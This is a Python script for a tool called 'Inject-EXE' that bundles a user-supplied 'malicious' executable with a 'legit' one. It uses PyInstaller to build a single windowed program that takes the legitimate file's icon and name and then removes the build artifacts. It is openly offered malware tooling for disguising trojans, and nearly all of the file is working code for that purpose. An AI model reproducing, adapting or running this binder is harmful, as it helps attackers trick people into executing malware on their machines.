import os
import subprocess
import PyInstaller.__main__
import shutil

def pyinstall(malFile, legitFile):
    try:
        with open("include\\extra.py", "rt") as fin:
            with open("pyinstall.py", "wt") as f:
                for line in fin:
                    f.write(line.replace('mal.exe', malFile).replace('legit.exe', legitFile))
    except IOError:
        print("Error: File not found or cannot be opened.")
        return False
    return True

def main():

    script_dir = os.path.dirname(os.path.abspath(__file__))

    print("\033[38;2;255;69;172m" + r'''
    ____        _           __        _______  __ ______
   /  _/___    (_)__  _____/ /_      / ____/ |/ // ____/
   / // __ \  / / _ \/ ___/ __/_____/ __/  |   // __/   
 _/ // / / / / /  __/ /__/ /_/_____/ /___ /   |/ /___   
/___/_/ /_/_/ /\___/\___/\__/     /_____//_/|_/_____/   
         /___/                                          
                                      By @malwarekid
''' + "\033[0m")

    mal_exe = input("Enter your \033[31mmalicious\033[0m executable: ")
    legit_exe = input("Enter your \033[32mlegit\033[0m executable: ")

    legit_exe_name = os.path.splitext(os.path.basename(legit_exe))[0] + "-output"

    if not pyinstall(legit_exe, mal_exe):
        print("Failed to generate pyinstall script. Exiting.")
        return

    pyinstaller_args = [
        '--onefile',
        '--windowed',
        f'--add-data={mal_exe};.',
        f'--add-data={legit_exe};.',
        f'--icon={legit_exe}',
        f'--distpath={script_dir}',
        f'--name={legit_exe_name}',
        'pyinstall.py'
    ]

    with open(os.devnull, 'w') as devnull:
        subprocess.run(['pyinstaller'] + pyinstaller_args, stdout=devnull, stderr=devnull)

    os.remove("pyinstall.py")
    spec_file = os.path.join(script_dir, f'{legit_exe_name}.spec')
    if os.path.exists(spec_file):
        os.remove(spec_file)
    build_dir = os.path.join(script_dir, 'build')
    if os.path.exists(build_dir):
        shutil.rmtree(build_dir)

    print(f"\033[32mInject-EXE generated and save as:\033[0m \033[31m{legit_exe_name}.exe\033[0m\n")

if __name__ == "__main__":
    main()
